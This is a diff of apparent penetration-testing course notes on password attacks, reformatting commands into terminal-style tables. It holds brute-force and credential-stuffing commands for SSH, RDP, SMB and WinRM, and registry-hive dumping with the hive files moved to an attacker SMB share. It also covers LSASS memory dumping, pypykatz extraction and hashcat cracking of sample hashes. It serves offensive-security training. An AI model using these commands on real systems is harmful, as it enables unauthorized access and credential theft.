@@ -2431,15 +2431,47 @@ NetExec serves as a powerful, modular framework for conducting password attacks 
 
 **Installing NetExec**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 sudo apt-get -y install netexec
 ```
 
+</td>
+</tr>
+</table>
+
 **NetExec Menu Options**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 netexec -h
 ```
+
+</td>
+</tr>
+</table>
 
 **NetExec Available Protocols**
 
@@ -2455,15 +2487,47 @@ netexec -h
 
 **NetExec Protocol-Specific Help**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 netexec <PROTOCOL> -h
 ```
 
+</td>
+</tr>
+</table>
+
 **NetExec Usage**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 netexec <PROTOCOL> <TARGET_IP> -u <USER> -p <PASSWORD>
 ```
+
+</td>
+</tr>
+</table>
 
 > The username and password fields can be just a string or a wordlist file.
 
@@ -2511,30 +2575,86 @@ A handy tool that we can use to communicate with the WinRM service is Evil-WinRM
 
 Brute Force Login
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 crackmapexec winrm <TARGET_IP> -u <USER_LIST> -p <PASSWORD_LIST> -q
 ```
 
+</td>
+</tr>
+</table>
+
 **Evil-WinRM**
 
-Install
+1. **Install** Evil-WinRM
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 sudo gem install evil-winrm
 ```
 
-Usage
+</td>
+</tr>
+</table>
+
+2. **Connect** to WinRM service
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD>
 ```
-```bash
-# Evil-WinRM shell v3.3
 
-# Info: Establishing connection to remote endpoint
+</td>
+</tr>
+<tr>
+<td colspan="2">
 
-# *Evil-WinRM* PS C:\Users\user\Documents>
+---
+
 ```
+Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\user\Documents>
+```
+
+</td>
+</tr>
+</table>
 
 > **NOTE:** If the login was successful, a terminal session is initialized using the Powershell Remoting Protocol (MS-PSRP), which simplifies the operation and execution of commands.
 
@@ -2583,17 +2703,49 @@ We can use a tool like **Hydra** to brute force SSH. This is covered in-depth in
 
 **Hydra - SSH**
 
-Brute force SSH
+1. **Brute force** SSH credentials
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 hydra -L <USER_LIST> -P <PASSWORD_LIST> ssh://<TARGET_IP>:<PORT>
 ```
 
-Log in to the system via SSH
+</td>
+</tr>
+</table>
+
+2. **Log in** via SSH
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 ssh <USER>@<TARGET_IP>
 ```
+
+</td>
+</tr>
+</table>
 
 > The username and password fields can be just a string or a wordlist file.
 
@@ -2606,17 +2758,51 @@ ssh <USER>@<TARGET_IP>
 
 **Hydra - RDP**
 
+1. **Brute force** RDP credentials
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 hydra -L <USER_LIST> -P <PASSWORD_LIST> rdp://<TARGET_IP>:<PORT>
 ```
 
+</td>
+</tr>
+</table>
+
 > The username and password fields can be just a string or a wordlist file.
 
-Log in to the system via xFreeRDP
+2. **Log in** via xFreeRDP
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 xfreerdp /v:<TARGET_IP> /u:'<USER>' /p:'<PASSWORD>'
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -2629,62 +2815,170 @@ xfreerdp /v:<TARGET_IP> /u:'<USER>' /p:'<PASSWORD>'
 
 **Hydra - SMB**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 hydra -L <USER_LIST> -P <PASSWORD_LIST> -V <TARGET_IP> smb
 ```
+
+</td>
+</tr>
+</table>
 
 > The username and password fields can be just a string or a wordlist file.
 
 **OPTION 1: CrackMapExec - SMB**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 crackmapexec smb <TARGET_IP> -u <USER_LIST> -p <PASSWORD_LIST>
 ```
 
+</td>
+</tr>
+</table>
+
 > The username and password fields can be just a string or a wordlist file.
 
-**OPTION 2: Metaploit - SMB**
+**OPTION 2: Metasploit - SMB**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 💣 <b>Metasploit</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`msf6 >`**
+
+</td>
+<td>
 
 ```bash
-sudo msfconsole -q
-
-msf6 > use auxiliary/scanner/smb/smb_login
-msf6 > options
-msf6 > set USER_FILE <USER_LIST>
-msf6 > set PASS_FILE <PASSWORD_LIST>
-msf6 > set RHOSTS <TARGET_IP>
-msf6 > set STOP_ON_SUCCESS true
-msf6 > set CreateSession true
-
-msf6 > run
+use auxiliary/scanner/smb/smb_login
+options
+set USER_FILE <USER_LIST>
+set PASS_FILE <PASSWORD_LIST>
+set RHOSTS <TARGET_IP>
+set STOP_ON_SUCCESS true
+set CreateSession true
+run
 ```
 
-If valid credentials credentials were found, a session is created
+</td>
+</tr>
+</table>
+
+If valid credentials were found, a session is created:
+
+<table width="100%">
+<tr>
+<td colspan="2"> 💣 <b>Metasploit</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`msf6 >`**
+
+</td>
+<td>
 
 ```bash
-msf6 > sessions
-
-msf6 > sessions -i <SESSION_ID>
-
-SMB (<TARGET_IP>) > shares
-
-SMB (<TARGET_IP>) > shares -i <SHARE_ID>
+sessions
+sessions -i <SESSION_ID>
 ```
 
+</td>
+</tr>
+</table>
+
+<table width="100%">
+<tr>
+<td colspan="2"> 💣 <b>Metasploit — SMB Session</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`SMB >`**
+
+</td>
+<td>
+
+```bash
+shares
+shares -i <SHARE_ID>
+```
+
+</td>
+</tr>
+</table>
 
 2. List Shares
 
 We can use NetExec to view the available shares and what privileges we have for them.
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 netexec smb <TARGET_IP> -u "<USER>" -p "<PASSWORD>" --shares
 ```
 
+</td>
+</tr>
+</table>
+
 3. Log in to the system via Smbclient
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 smbclient -U <USER> \\\\<TARGET_IP>\\<SHARENAME>
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -2723,9 +3017,25 @@ High-risk scenarios:
 
 **Example**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 netexec smb 10.100.38.0/24 -u <USERNAMES> -p 'Corp1234'
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -2734,9 +3044,25 @@ netexec smb 10.100.38.0/24 -u <USERNAMES> -p 'Corp1234'
 
 Credential stuffing leverages compromised credentials from one service to gain unauthorized access to unrelated systems, exploiting widespread password reuse across platforms (email, SaaS, enterprise systems).
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 hydra -C user_pass_list.txt ssh://<TARGET_IP> -t 4 -W 5
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -2747,44 +3073,102 @@ Network infrastructure devices and enterprise software frequently ship with fact
 
 While several lists of known default credentials are available online, there are also dedicated tools that automate the process. One widely used example is the [Default Credentials Cheat Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet).
 
-Install
+1. **Install** the tool
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 pip3 install defaultcreds-cheat-sheet
 ```
 
+</td>
+</tr>
+</table>
+
+2. **Search** for default credentials
+
 Once installed, we can use the creds command to search for known default credentials associated with a specific product or vendor.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 creds search <KEYWORD>
 ```
 
-Example:
+</td>
+</tr>
+</table>
+
+**Example:**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 creds search linksys --export
-
-# +---------------+---------------+------------+
-# | Product       |    username   |  password  |
-# +---------------+---------------+------------+
-# | linksys       |    <blank>    |  <blank>   |
-# | linksys       |    <blank>    |   admin    |
-# | linksys       |    <blank>    | epicrouter |
-# | linksys       | Administrator |   admin    |
-# | linksys       |     admin     |  <blank>   |
-# | linksys       |     admin     |   admin    |
-# | linksys       |    comcast    |    1234    |
-# | linksys       |      root     |  orion99   |
-# | linksys       |      user     |  tivonpw   |
-# | linksys (ssh) |     admin     |   admin    |
-# | linksys (ssh) |     admin     |  password  |
-# | linksys (ssh) |    linksys    |  <blank>   |
-# | linksys (ssh) |      root     |   admin    |
-# +---------------+---------------+------------+
-
-# [+] Creds saved to /tmp/linksys-usernames.txt , /tmp/linksys-passwords.txt 📥
 ```
 
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
++---------------+---------------+------------+
+| Product       |    username   |  password  |
++---------------+---------------+------------+
+| linksys       |    <blank>    |  <blank>   |
+| linksys       |    <blank>    |   admin    |
+| linksys       |    <blank>    | epicrouter |
+| linksys       | Administrator |   admin    |
+| linksys       |     admin     |  <blank>   |
+| linksys       |     admin     |   admin    |
+| linksys       |    comcast    |    1234    |
+| linksys       |      root     |  orion99   |
+| linksys       |      user     |  tivonpw   |
+| linksys (ssh) |     admin     |   admin    |
+| linksys (ssh) |     admin     |  password  |
+| linksys (ssh) |    linksys    |  <blank>   |
+| linksys (ssh) |      root     |   admin    |
++---------------+---------------+------------+
+
+[+] Creds saved to /tmp/linksys-usernames.txt , /tmp/linksys-passwords.txt 📥
+```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -2817,107 +3201,270 @@ There are three registry hives we can copy if we have local administrative acces
 
 </details>
 
-1. **Use reg.exe to save copies of the registry hives *(requires launching cmd.exe with administrative privileges)***
+1. **Save** copies of the registry hives *(requires launching cmd.exe with administrative privileges)*
 
-    **Target Machine:** Save the contents of the HKLM\SAM registry hive to a file named 'sam.save'
+Save the contents of the HKLM\SAM registry hive to a file named 'sam.save':
 
-    ```cmd
-    reg.exe save hklm\sam %USERPROFILE%\Desktop\sam.save
-    ```
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
 
-    **Target Machine:** Save the contents of the HKLM\SYSTEM registry hive to a file named 'system.save'
+**`C:\>`**
 
-    ```cmd
-    reg.exe save hklm\system %USERPROFILE%\Desktop\system.save
-    ```
+</td>
+<td>
 
-    **Target Machine:** Save the contents of the HKLM\SECURITY registry hive to a file named 'security.save'
+```cmd
+reg.exe save hklm\sam %USERPROFILE%\Desktop\sam.save
+```
 
-    ```cmd
-    reg.exe save hklm\security %USERPROFILE%\Desktop\security.save
-    ```
+</td>
+</tr>
+</table>
 
-    After saving the registry hives offline, we can transfer them to our attack host using several methods. In this example, we'll use Impacket's smbserver along with basic CMD commands to copy the hive files to a shared folder hosted on the attacker machine.
+Save the contents of the HKLM\SYSTEM registry hive to a file named 'system.save':
 
-2. Transfer the files from the target machine to the attack machine
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
 
-    **Attack Machine:** Create a share with smbserver
+**`C:\>`**
 
-    ```bash
-    mkdir ~/winhives
-    sudo smbserver.py -smb2support share ~/winhives
-    ```
+</td>
+<td>
 
-    **Target Machine:** Transfer the hive copies to the share
+```cmd
+reg.exe save hklm\system %USERPROFILE%\Desktop\system.save
+```
 
-    ```bash
-    C:\> move sam.save \\<ATTACKER_IP>\share
-    ```
+</td>
+</tr>
+</table>
 
-    ```bash
-    C:\> move security.save \\<ATTACKER_IP>\share
-    ```
+Save the contents of the HKLM\SECURITY registry hive to a file named 'security.save':
 
-    ```bash
-    C:\> move system.save \\<ATTACKER_IP>\share
-    ```
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
 
-3. **Dump the hashes with secretsdump**
+**`C:\>`**
 
-    **Attack Machine:** Run [`secretsdump.py`](../scripts/passwords/secretsdump.py) with Python and specify each of the hive files we retrieved from the target host.
+</td>
+<td>
 
-    ```bash
-    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
-    ```
+```cmd
+reg.exe save hklm\security %USERPROFILE%\Desktop\security.save
+```
 
-    Notice the following line:
+</td>
+</tr>
+</table>
 
-    ```bash
-    # Dumping local SAM hashes (uid:rid:lmhash:nthash)
-    ```
+After saving the registry hives offline, we can transfer them to our attack host using several methods. In this example, we'll use Impacket's smbserver along with basic CMD commands to copy the hive files to a shared folder hosted on the attacker machine.
 
-    This tells us how to interpret the output and which hashes we can attempt to crack. 
-    
-    With this in mind, we can extract the NT hashes for each user account into a text file and begin the password cracking process. Keeping track of which hash belongs to which user is helpful for organizing and interpreting the results.
+2. **Transfer** the files from the target machine to the attack machine
 
-    > **NOTE:** The first step secretsdump performs is retrieving the system bootkey, which is required to decrypt the local SAM hashes. This is because the bootkey is used to encrypt and decrypt the SAM database. Without access to it, the hashes cannot be decrypted—making it essential to have copies of the relevant registry hives, as previously discussed.
+Create a share with smbserver on the attack machine:
 
-4. **Crack the hashes with Hashcat**
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
 
-    **Attack Machine:** Populate a text file with the NT hashes we were able to dump
+**`kali@kali:~$`**
 
-    ```bash
-    cat windowshashes.txt
+</td>
+<td>
 
-    31d6cfe0d16ae931b73c59d7e0c089c0
-    c02478537b9727d391bc80011c2e2321
-    58a478135a93ac3bf058a5ea0e8fdb71
-    ```
+```bash
+mkdir ~/winhives
+sudo smbserver.py -smb2support share ~/winhives
+```
 
-    **Attack Machine:** Run Hashcat against NT hashes
+</td>
+</tr>
+</table>
 
-    ```bash
-    sudo hashcat -m 1000 windowshashes.txt /usr/share/wordlists/rockyou.txt
-    ```
+Transfer the hive copies to the share from the target:
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
+
+```cmd
+move sam.save \\<ATTACKER_IP>\share
+move security.save \\<ATTACKER_IP>\share
+move system.save \\<ATTACKER_IP>\share
+```
+
+</td>
+</tr>
+</table>
+
+3. **Dump** the hashes with secretsdump
+
+Run [`secretsdump.py`](../scripts/passwords/secretsdump.py) with Python and specify each of the hive files we retrieved from the target host:
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+Dumping local SAM hashes (uid:rid:lmhash:nthash)
+```
+
+</td>
+</tr>
+</table>
+
+This tells us how to interpret the output and which hashes we can attempt to crack.
+
+With this in mind, we can extract the NT hashes for each user account into a text file and begin the password cracking process. Keeping track of which hash belongs to which user is helpful for organizing and interpreting the results.
+
+> **NOTE:** The first step secretsdump performs is retrieving the system bootkey, which is required to decrypt the local SAM hashes. This is because the bootkey is used to encrypt and decrypt the SAM database. Without access to it, the hashes cannot be decrypted—making it essential to have copies of the relevant registry hives, as previously discussed.
+
+4. **Crack** the hashes with Hashcat
+
+Populate a text file with the NT hashes we were able to dump:
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+cat windowshashes.txt
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+31d6cfe0d16ae931b73c59d7e0c089c0
+c02478537b9727d391bc80011c2e2321
+58a478135a93ac3bf058a5ea0e8fdb71
+```
+
+</td>
+</tr>
+</table>
+
+Run Hashcat against NT hashes:
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+sudo hashcat -m 1000 windowshashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+</td>
+</tr>
+</table>
 
     Obtaining these passwords can be valuable in several ways. For instance, the cracked credentials might allow us to access other systems on the network—especially since password reuse across different work or personal accounts is common. Understanding and applying this technique is particularly useful during assessments and can be leveraged whenever we compromise a vulnerable Windows system and obtain administrative privileges to dump the SAM database.
 
 <details>
 <summary><h3>DCC2 hashes</h3></summary>
 
-As previously mentioned, `HKLM\SECURITY` contains cached domain logon information, specifically in the form of DCC2 hashes. These are local, hashed representations of network credentials. 
+As previously mentioned, `HKLM\SECURITY` contains cached domain logon information, specifically in the form of DCC2 hashes. These are local, hashed representations of network credentials.
 
 **Example hash**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📄 <b>Text</b> </td>
+</tr>
+<tr>
+<td>
 
 ```
 exampledomain.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
 ```
 
-**Run Hashcat against NT hashes**
+</td>
+</tr>
+</table>
+
+**Run Hashcat against DCC2 hashes**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -2947,15 +3494,47 @@ With credentials that have local administrator privileges, it's also possible to
 
 **Dumping LSA secrets remotely**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
-netexec smb <TARGET IP> --local-auth -u <USERNAME> -p <PASSWORD> --lsa
+netexec smb <TARGET_IP> --local-auth -u <USERNAME> -p <PASSWORD> --lsa
 ```
+
+</td>
+</tr>
+</table>
 
 **Dumping SAM Remotely**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
-netexec smb <TARGET IP> --local-auth -u <USERNAME> -p <PASSWORD> --sam
+netexec smb <TARGET_IP> --local-auth -u <USERNAME> -p <PASSWORD> --sam
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -3004,10 +3583,30 @@ Before issuing the command to create the dump file, we must determine what proce
 
 **Finding LSASS's PID in cmd**
 
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
+
 ```cmd
 tasklist /svc
 ```
-```cmd
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 Image Name                     PID Services
 ========================= ======== ============================================
 ...
@@ -3015,22 +3614,66 @@ lsass.exe                      672 KeyIso, SamSs, VaultSvc
 ...
 ```
 
+</td>
+</tr>
+</table>
+
 **Finding LSASS's PID in PowerShell**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
 
 ```powershell
 Get-Process lsass
 ```
-```cmd
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 -------  ------    -----      -----     ------     --  -- -----------
    1260      21     4948      15396       2.56    672   0 lsass
 ```
 
+</td>
+</tr>
+</table>
+
 **Creating a dump file using PowerShell *(with an elevated PowerShell session)***
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
 
 ```powershell
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
 ```
+
+</td>
+</tr>
+</table>
 
 With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`). 
 
@@ -3045,7 +3688,19 @@ If we manage to run this command and generate the lsass.dmp file, we can proceed
 
 Once the dump file is transferred to our attack host, we can use a powerful tool called [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials directly from the .dmp file.
 
-**Install**
+1. **Install** pypykatz
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 git clone https://github.com/skelsec/pypykatz.git
@@ -3053,71 +3708,151 @@ cd pypykatz
 sudo python3 setup.py install
 ```
 
-At the time of writing, Mimikatz only runs on Windows systems. This means we’d either need a Windows-based attack host or run Mimikatz directly on the target—an approach that carries greater risk. In contrast, pypykatz offers a more convenient and stealthy alternative, as it can be run offline on a Linux-based attack host using just a copy of the dump file.
+</td>
+</tr>
+</table>
+
+At the time of writing, Mimikatz only runs on Windows systems. This means we'd either need a Windows-based attack host or run Mimikatz directly on the target—an approach that carries greater risk. In contrast, pypykatz offers a more convenient and stealthy alternative, as it can be run offline on a Linux-based attack host using just a copy of the dump file.
 
 When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present.
 
-**Running Pypykatz**
+2. **Run** pypykatz
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 pypykatz lsa minidump ./lsass.DMP
 ```
 
-**Output**
+</td>
+</tr>
+</table>
 
-MSV
+**Output Sections**
 
-```bash
-	== MSV ==
-		Username: bob
-		Domain: DESKTOP-33E7O54
-		LM: NA
-		NT: 64f12cddaa88057e06a81b54e73b949b
-		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
-		DPAPI: NA
+**MSV**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📄 <b>Output</b> </td>
+</tr>
+<tr>
+<td>
+
 ```
+== MSV ==
+    Username: bob
+    Domain: DESKTOP-33E7O54
+    LM: NA
+    NT: 64f12cddaa88057e06a81b54e73b949b
+    SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
+    DPAPI: NA
+```
+
+</td>
+</tr>
+</table>
 
 [MSV](https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that the Local Security Authority (LSA) uses to validate logon attempts against the SAM database. In this case, pypykatz extracted details from the `bob` user account's logon session stored in LSASS memory—including the SID, username, domain, and both the NT and SHA1 password hashes.
 
-WDIGEST
+**WDIGEST**
 
-```bash
-	== WDIGEST [14ab89]==
-		username bob
-		domainname DESKTOP-33E7O54
-		password None
-		password (hex)
+<table width="100%">
+<tr>
+<td colspan="2"> 📄 <b>Output</b> </td>
+</tr>
+<tr>
+<td>
+
 ```
+== WDIGEST [14ab89]==
+    username bob
+    domainname DESKTOP-33E7O54
+    password None
+    password (hex)
+```
+
+</td>
+</tr>
+</table>
 
 WDIGEST is an older authentication protocol that was enabled by default in Windows XP through Windows 8, as well as Windows Server 2003 through 2012. When enabled, LSASS caches WDIGEST credentials in **clear-text**, meaning that if we target a system with WDIGEST active, there's a high chance of retrieving a plaintext password. However, in modern Windows versions, WDIGEST is **disabled by default** to mitigate this risk.
 
-Kerberos
+**Kerberos**
 
-```bash
-	== Kerberos ==
-		Username: bob
-		Domain: DESKTOP-33E7O54
+<table width="100%">
+<tr>
+<td colspan="2"> 📄 <b>Output</b> </td>
+</tr>
+<tr>
+<td>
+
 ```
+== Kerberos ==
+    Username: bob
+    Domain: DESKTOP-33E7O54
+```
+
+</td>
+</tr>
+</table>
 
 [Kerberos](https://web.mit.edu/kerberos/#what_is) is a network authentication protocol used by **Active Directory** in Windows domain environments. When a domain user authenticates, they are issued tickets that allow access to authorized network resources without re-entering credentials. LSASS stores Kerberos-related data such as passwords, encryption keys (ekeys), tickets, and PINs in memory. This makes it possible to extract these artifacts from LSASS and use them to access other systems within the same domain.
 
-DPAPI
+**DPAPI**
 
-```bash
-	== DPAPI [14ab89]==
-		luid 1354633
-		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
-		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
-		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
+<table width="100%">
+<tr>
+<td colspan="2"> 📄 <b>Output</b> </td>
+</tr>
+<tr>
+<td>
+
 ```
+== DPAPI [14ab89]==
+    luid 1354633
+    key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
+    masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
+    sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
+```
+
+</td>
+</tr>
+</table>
 
 Mimikatz and pypykatz can extract DPAPI master keys for logged-on users whose data resides in LSASS process memory. These master keys can then be used to decrypt secrets stored by various applications that rely on DPAPI, potentially revealing credentials for multiple accounts. DPAPI attack techniques are explored in greater depth in the [WINDOWS PRIVILEGE ESCALATION](./23-windows-privilege-escalation.md) module.
 
-**Cracking the NT Hash with Hashcat**
+3. **Crack** the NT Hash with Hashcat
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -3150,9 +3885,25 @@ Microsoft often refers to the protected credential stores as Credential Lockers 
 
 It is possible to export Windows Vaults to .crd files either via Control Panel or with the following command:
 
+<table width="100%">
+<tr>
